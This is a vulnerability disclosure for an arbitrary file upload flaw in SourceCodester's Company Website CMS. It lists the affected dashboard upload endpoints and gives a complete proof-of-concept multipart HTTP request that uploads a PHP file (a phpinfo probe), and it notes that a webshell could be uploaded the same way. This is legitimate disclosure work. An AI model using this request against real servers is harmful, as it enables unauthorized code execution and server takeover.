## Company Website CMS Dashboard Exists Arbitrary File Upload

[Company Website CMS](https://www.sourcecodester.com/php/15517/company-website-cms-php.html) Released by SourceCodester Has Arbitrary File Upload Vulnerability

Each file upload page in the background allows arbitrary file uploads. After the attacker enters the background, he can upload a webshell to control the server.

### Arbitrary file upload vulnerability exists in the following access paths

```
/dashboard/createblog
/dashboard/createservice
/dashboard/createportfolio
/dashboard/createslide
/dashboard/newtestimony
/dashboard/logo
```

The following is the corresponding file path

```
/dashboard/add-blog.php
/dashboard/add-portfolio.php
/dashboard/add-service.php
/dashboard/add-slider.php
/dashboard/add-testimony.php
/dashboard/add-user.php
/dashboard/editblog.php
/dashboard/editport.php
/dashboard/editservice.php
/dashboard/edituser.php
/dashboard/section-title.php
/dashboard/site-settings.php
/dashboard/static-home.php
/dashboard/updatecontact.php
/dashboard/updatelogo.php
```



### Take `/dashboard/logo` as an example

```
http://xxxx/dashboard/logo
```

![image-20220806192347786](Company%20Website%20CMS-FileUpload.assets/image-20220806192347786.png)

![image-20220806192512556](Company%20Website%20CMS-FileUpload.assets/image-20220806192512556.png)

```
POST /vogue/dashboard/logo HTTP/1.1
Host: 192.168.11.154
Content-Length: 483
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.11.154
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAyj41gZ8wBTnV1FL
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.11.154/vogue/dashboard/logo
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=50tlte4hmi0glidrcg38mvpflk
Connection: close

------WebKitFormBoundaryAyj41gZ8wBTnV1FL
Content-Disposition: form-data; name="xfile"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundaryAyj41gZ8wBTnV1FL
Content-Disposition: form-data; name="ufile"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundaryAyj41gZ8wBTnV1FL
Content-Disposition: form-data; name="save"


------WebKitFormBoundaryAyj41gZ8wBTnV1FL--

```

The upload path can be seen in the response

![image-20220806192610183](Company%20Website%20CMS-FileUpload.assets/image-20220806192610183.png)

Access this path

![image-20220806192937588](Company%20Website%20CMS-FileUpload.assets/image-20220806192937588.png)



### Vulnerable code

![image-20220806193354210](Company%20Website%20CMS-FileUpload.assets/image-20220806193354210.png)

Upload the file directly without any filtering

## Link

https://www.sourcecodester.com/php/15517/company-website-cms-php.html
